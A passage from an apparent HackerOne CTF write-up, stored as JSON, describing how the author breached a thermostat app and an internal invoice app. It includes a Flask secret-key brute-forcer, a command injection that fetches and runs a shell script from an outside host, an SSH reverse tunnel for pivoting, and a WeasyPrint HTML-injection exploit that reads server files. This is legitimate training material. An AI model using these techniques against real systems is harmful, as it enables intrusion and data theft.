    engine.queue(target.req, x)\n```\n\nBut nothing different. Let's try some injection, setting the port to `password@myserver.com:80` could lead to `http://update.flitethermostat:password@myserver.com:80/` and thus achieving a SSRF to `myserver.com`. But it didn't happen, the server returned error 500. Port was an integer parameter. Time to breath...\n\n#### JWT\n\nAfter logged in a session cookie is assigned which appears to be a flask JWT. jwt.io defines: *JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.* It also says that *JSON Web Tokens consist of three parts separated by dots (.), which are: Header.Payload.Signature .... this JSON is Base64Url encoded....*.\n\nBase64 decoded the first part:\n```\n# session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0\n# eyJsb2dnZWRJbiI6dHJ1ZX0\n# echo -n 'eyJsb2dnZWRJbiI6dHJ1ZX0='  | base64 -d\n{\"loggedIn\":true}\n```\n\nThere is only a `loggedIn` attribute... Nevertheless I decided to extend `https://github.com/noraj/flask-session-cookie-manager`  and create a brute force to `app.secret_key` which is used to sign JWT in a flask app.\n\n```python\n...\nparser_brute = subparsers.add_parser('brute', help='brute')\nparser_brute.add_argument('-p', '--payload', metavar='\u003cstring\u003e',\n                            help='Cookie value', required=True)\nparser_brute.add_argument('-w', '--wordlist', metavar='\u003cstring\u003e',\n                            help='Wordlist', required=True)\n...\ndef bruteforce(payl, wordl):   \n    f = open(wordl, 'r')\n    for line in f:\n        s = session_cookie_decoder(payl,line.strip())\n        print(line.strip() +'  '+ s)\n        if 'error' not in s:\n            print(line.strip + ' \u003c\u003c\u003c\u003c----- KEY')\n            return\n...\n```\n\nDead end!\n\n#### _\n\nI was forgetting something:\n\n{F451366}\n\nCody is the creator of the CTF. Could this be a hint? I really didn't know. But that made me try parameters with `_`:\n```\nupdate_server=test\nserver_host=test\nhost_server=test\nupdate_host=test\n```\n\nSuddenly, I got `Connecting to http://test:5000/ and downloading update manifest`!! Yeah! So I was able to change the hostname and so do a SSRF... No, No. None of my attempts triggered a http request. What about a command injection? Using backticks (\\`) I was able to inject a sleep command. Success, let's do a reverse shell:\n\n```\nGET /update?port=80\u0026update_host=localhos`wget+http://X.X.X.X:666/shell.py+-O+/tmp/.shell.py;python+/tmp/.shell.py;rm+-rf+/tmp/.shell.py`t HTTP/1.1\nHost: 104.196.12.98\nCookie: session=eyJsb2dnZWRJbiI6dHJ1ZX0.XIHPog.46NKzPROJLINKkYDyQpOQI27JD0\n```\n\nWe are inside! Where is the flag?\n\n## Internal Server (172.28.0.3) - Invoice App\n\nThere were no flags! Doing an initial recon I noticed that I was in a docker container. And the first thing that came to my mind was CVE-2019-5736, a docker container escape to host. But I decided to look more, initially the app source code at `/app/main.py`. Then check if there was others containers on the same network. What a surprise when I found another server at `172.28.0.3` with port 80 open. Using curl I was able to see that it was another web app, something about Hackerone invoices! \n\n### Tunnel\n\nTo make my life easier and to not leak what I was doing I decided to make an SSH tunnel to my server with a port forwarding:\n\n```bash\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\nssh -fN  -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no -R *:81:172.28.0.3:80 root@X.X.X.X -p 32777\n```\n\nThe above SSH command will forward all connection to local port 81 on X.X.X.X to 172.28.0.3:80. So from this moment on, I could use all my local exploits using localhost:81 as the target. \n\n### Login\n\nBrowsing the web app the first thing we could see is a login form. And again my first shot was a SQL Injection, which made no sense at all. Using only a backtick would fire an exception, but I could not build a valid query. Also tried SQLMap:\n\n```bash\n# python sqlmap.py -u http://localhost:81/auth --data \"username=admin\u0026password=admin\" --level=5 --risk=3\n```\n\nI also tried XPATH injection, LDAP injection and NoSQL injection. Nothing worked. Let's move on.\n\n### New Invoice\n\nWe were also able to create invoices at `/invoices/new`. All the logic was inside `newInvoice.js`:\n\n```javascript\nfunction preview() {\n        // kTHJ9QYJY5597pY7uLEQCv9xEbpk41BDeRy82yzx24VggvcViiCuXqXvF11TPusmb5TucH\n        //  5MmCWZhKJD29KVGZLrB6hBbLkRPn8o6H5bF73SgHyR3BdmoVJ9hWvtHfD3NNz6rBsLqV9\n        var p = encodeInvoice();\n        var url = 'http://' + window.location.hostname + '/invoices/preview?d=' + encodeURIComponent(p);\n        url = url.replace(/[\\u00A0-\\u9999\u003c\u003e\\\u0026]/gim, function(i) { return '\u0026#'+i.charCodeAt(0)+';'; });\n        $('#iframe-box').empty();\n        $('#iframe-box').append($('\u003ciframe width=\"100%\" height=\"500px\" src=\"' + url + '\"\u003e\u003c/iframe\u003e'));\n}\n\nfunction savePDF() {\n        var p = encodeInvoice();\n        var url = 'http://' + window.location.hostname + '/invoices/pdfize?d=' + encodeURIComponent(p);\n        url = url.replace(/[\\u00A0-\\u9999\u003c\u003e\\\u0026]/gim, function(i) { return '\u0026#'+i.charCodeAt(0)+';'; });\n        var a = $('\u003ca download href=\"' + url + '\"\u003e\u003cspan\u003e\u003ci\u003eIf your download does not start, click here\u003c/i\u003e\u003c/span\u003e\u003c/a\u003e');\n        $('#iframe-box').append(a);\n        a.find('span').trigger('click');\n}\n```\n\nUsing `/invoice/preview` we get a html page with our invoice and using `/invoice/pdfize` we get a PDF with the same content. Analyzing the rest of the code I was able to send a valid request to both endpoints using curl:\n\n```bash\ncurl -gv 'http://localhost:81/invoices/preview?d={\"companyName\":\"Hackerone\",\"email\":\"aaa@hackerone.com\",\"invoiceNumber\":\"1\",\"date\":\"2019-03-08\",\"items\":[[\"1\",\"manoelt\",\"manoelt\",\"2\"],[\"1\",\"manoelt\",\"manoelt\",\"2\"],[\"1\",\"manoelt\",\"manoelt\",\"2\"]],\"styles\":{\"body\":{\"background-color\":\"white\"}}}'; echo;\n\ncurl -gv 'http://localhost:81/invoices/pdfize?d={\"companyName\":\"Hackerone\",\"email\":\"aaa@hackerone.com\",\"invoiceNumber\":\"1\",\"date\":\"2019-03-08\",\"items\":[[\"1\",\"manoelt\",\"manoelt\",\"22222\",\"2\"],[\"1\",\"manoelt\",\"manoelt\",\"2\"],[\"1\",\"manoelt\",\"manoelt\",\"2\"]],\"styles\":{\"body\":{\"background-color\":\"white\"}}}' -o invoice.pdf; echo;\n```\n\nOne of the first things that I try when attacking a python web application is Server Side Template Injection. Although we have several input options on the json above, none gave me a SSTI using `{{7*7}}` as payload. Also, what catches our attention is the permission to define styles for the web page, as we already know that using css we could leak information of a web page [17], but it does not seem to be useful here. But we could get some more recon information if we were able to trigger a HTTP request using `url()`: \n\n`...\"styles\":{\"body\":{\"background-image\":\"url('http://myserver.com.br/')\"...`. \n\nAnd I got a request on my server with this header: `User-Agent: WeasyPrint 44 (http://weasyprint.org/)`.\n\n### WeasyPrint\n\nWhat is WeasyPrint? From https://github.com/Kozea/WeasyPrint/ : *WeasyPrint is a smart solution helping web developers to create PDF documents. It turns simple HTML pages into gorgeous statistical reports, invoices, tickets…*. Ok, time to understand more this python library. \n\nReading the docs I saw this: *When used with untrusted HTML or untrusted CSS, WeasyPrint can meet security problems. You will need extra configuration in your Python application to avoid high memory use, endless renderings or local files leaks.*. Nice! All we need to know now is how to exploit this flaw. Maybe someone opened an issue on github? It was not the case. But, I found this pull request:\n\n\"Added support for PDF attachments.\" (https://github.com/Kozea/WeasyPrint/pull/177).\n\nWhat an amazing feature! So, using `\u003clink rel='attachment' href='file_path'\u003e` WeasyPrint will attach the file from href location to the PDF. I am sure that it is all we need.\n\nLet's test all json attributes to inject HTML code. Nothing better than creating a python script to help us:\n\n```python\n...\nURL = 'http://localhost:81/invoices/'\n...\ndef pdfize(payl, filename):\n    r = requests.get(URL+PDFIZE, params=payload)\n    with open('invoices/'+filename, 'wb') as fd:\n        for chunk in r.iter_content(chunk_size=128):\n            fd.write(chunk)\n\ndef preview(payl):\n    r = requests.get(URL+PREVIEW, params=payload)\n    print(r.content)\n\ninvoice = {\"companyName\":\"\u003c/style\", \"email\":\"\u003c/style\", \"invoiceNumber\":\"1\", \"date\":\"\u003chtml\", \"\u003c\":\"\u003e\", \"items\":[[\"1\",\"manoelt\u003cscript\",\"manoelt\u003c/script\",\"2\"],[\"1\",\"manoelt\",\"manoelt\",\"2\"]],\"styles\":{\"body\":{\"}\u003c/style background-color\":\"white\"}}}\npayload = {\"d\" : json.dumps(invoice)}\npdfize(payload, \"style_invoice.pdf\")\npreview(payload)\n```\n\nAnd through only one attribute I was able to inject HTML: CSS property! But the backend was not allowing `\u003e`... And this tip from [18]: `You can use // to close a tag instead of \u003e.` made the final exploit:\n\n```python\n\ninvoice = {\"companyName\":\"\", \"email\":\"\", \"invoiceNumber\":\"1\", \"date\":\"html\", \"\u003c\":\"\u003e\", \"items\":[[\"1\",\"manoelt\",\"manoelt\",\"2\"],[\"1\",\"manoelt\",\"manoelt\",\"2\"]],\"styles\":{\"body\":{\"}\u003c/style//\u003clink rel='attachment' href='file:///app/main.py'\u003e\u003cstyle\u003e body: {  background-color\":\"white\"}}}\npayload = {\"d\" : json.dumps(invoice)}\npdfize(payload, \"style_invoice.pdf\")\n```\n\nFinally I opened the PDF and there it was:\n\n{F451368}\n\n```\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n```\n\nHERE IT IS: c8889970d9fb722066f31e804e351993\n\n\n### References\n1. https://crackstation.net/hashing-security.htm\n2. https://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf\n3. https://github.com/skylot/jadx\n4. https://en.wikipedia.org/wiki/Symmetric-key_algorithm\n5. https://en.wikipedia.org/wiki/Binary_search_algorithm\n6. https://www.tcpdump.org/\n7. https://github.com/maurosoria/dirsearch\n8. https://github.com/danielmiessler/SecLists\n9. https://github.com/sqlmapproject/sqlmap\n10. https://en.wikipedia.org/wiki/Length_extension_attack\n11. https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks\n12. https://github.com/ffuf/ffuf\n13. https://github.com/digininja/CeWL\n14. https://www.python.org/dev/peps/pep-0515/\n15. https://github.com/PortSwigger/turbo-intruder\n16. https://github.com/noraj/flask-session-cookie-manager\n17. https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense\n18. https://github.com/s0md3v/AwesomeXSS\n\n## Impact\n\nH1-702","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eFor a brief overview of the challenge you can take a look at the following image:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Thermostat_App_Infrastructure.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/370/ca50f43383d0085f335d8202f77d74e19a9825a4/Thermostat_App_Infrastructure.png?response-content-disposition=attachment%3B%20filename%3D%22Thermostat_App_Infrastructure.png%22%3B%20filename%2A%3DUTF-8%27%27Thermostat_App_Infrastructure.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=aa1eafd7c17e5fee332989b21f1d3155c4c182f5d27570af198c0dfe698779e4\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/370/ca50f43383d0085f335d8202f77d74e19a9825a4/Thermostat_App_Infrastructure.png?response-content-disposition=attachment%3B%20filename%3D%22Thermostat_App_Infrastructure.png%22%3B%20filename%2A%3DUTF-8%27%27Thermostat_App_Infrastructure.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=aa1eafd7c17e5fee332989b21f1d3155c4c182f5d27570af198c0dfe698779e4\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eBelow I will detail each step that I took to solve the CTF, moreover all the bad assumptions that led me to a dead end in some cases.\u003c/p\u003e\n\n\u003ch2 id=\"twitter\"\u003eTwitter\u003c/h2\u003e\n\n\u003cp\u003eThe CTF begins with this tweet:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"tweet.PNG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/371/df1c6838667296680105c3cd835b1fae140b8e6c/tweet.PNG?response-content-disposition=attachment%3B%20filename%3D%22tweet.PNG%22%3B%20filename%2A%3DUTF-8%27%27tweet.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=d31bc76bcabd1febc4c2395c95e072bc1bce25aef969a31999d9838f1b2c283a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/371/df1c6838667296680105c3cd835b1fae140b8e6c/tweet.PNG?response-content-disposition=attachment%3B%20filename%3D%22tweet.PNG%22%3B%20filename%2A%3DUTF-8%27%27tweet.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=d31bc76bcabd1febc4c2395c95e072bc1bce25aef969a31999d9838f1b2c283a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"what-is-this-binary\"\u003eWhat is this binary?\u003c/h3\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"binary.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/365/f3e178d0d8e418da0e3864d932c7eb40ca38bfae/binary.png?response-content-disposition=attachment%3B%20filename%3D%22binary.png%22%3B%20filename%2A%3DUTF-8%27%27binary.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=ca77cd7498d17009ed30fe21606b5a101935a8cbf7be2abd76db8d99c474a3c8\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/451/365/f3e178d0d8e418da0e3864d932c7eb40ca38bfae/binary.png?response-content-disposition=attachment%3B%20filename%3D%22binary.png%22%3B%20filename%2A%3DUTF-8%27%27binary.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061333Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026amp;X-Amz-Signature=ca77cd7498d17009ed30fe21606b5a101935a8cbf7be2abd76db8d99c474a3c8\" class=\"markdown-inline-image\" style=\"display: 